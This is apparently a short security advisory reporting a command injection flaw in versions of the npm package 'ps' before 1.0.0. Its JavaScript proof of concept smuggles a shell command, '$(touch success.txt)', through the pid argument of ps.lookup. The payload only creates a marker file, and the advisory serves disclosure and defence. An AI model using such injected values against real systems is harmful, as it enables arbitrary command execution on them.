  title: Command Injection
  description: |-
    Versions of `ps` before 1.0.0 are vulnerable to command injection.

    Proof of concept:

    ```
    var ps = require('ps');

    ps.lookup({ pid: "$(touch success.txt)" }, function(err, proc) { // this method is vulnerable to command injection
        if (err) {throw err;}
        if (proc) {
            console.log(proc);  // Process name, something like "node" or "bash"
        } else {
            console.log('No such process');
        }
    });

    // Result: The file success.txt will exist on the filesystem if the touch command was executed
    ```
